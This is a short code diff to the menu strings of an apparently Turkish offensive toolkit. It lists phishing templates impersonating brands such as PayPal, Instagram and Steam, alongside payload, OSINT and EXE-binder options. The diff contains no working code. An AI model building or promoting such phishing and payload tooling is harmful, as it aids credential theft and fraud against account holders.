@@ -41,11 +41,22 @@ Uyarı: Bu toolu kullanırken lütfen illegal yerlerde kullanmayınız ve soruml
             "payload_menu": "═══════ PAYLOAD SEÇİMİ ═══════\n1) Linux Payload\n2) Windows Payload\n0) Geri",
             "osint_menu": "═══════ OSINT TOOLS ═══════\n1) Foto OSINT (EXIF)\n2) Sys OSINT (Sosyal Platformlar)\n3) Insta OSINT (Instagram)\n0) Geri",
             "phishing_menu": """════════ PHISHING TOOLS ════════
- 1) Cloudflare      2) Discord       3) Dropbox      4) e-Bay
- 5) e-Devlet        6) Facebook      7) GarantiBBVA  8) Google
- 9) Instagram      10) Microsoft    11) PayPal      12) Spotify
-13) Steam          14) TikTok       15) Trendyol    16) Twitch
-17) Twitter        18) Yeni Google
+1) Cloudflare 
+2) Discord
+3) Drobbox
+4) e-bay
+5) Facebook
+6) Google
+7) İnstagram
+8) Microsoft
+9) PayPal
+10) spotify
+11) Steam
+12) TikTok
+13) Trendyol
+14) Twich
+15) Twitter
+16) Yeni google
  0) Geri""",
             "binder_starting": "[+] EXE Binder başlatılıyor...",
             "binder_not_found": "[!] exebinder.py veya linux_exebinder.py bulunamadı!",
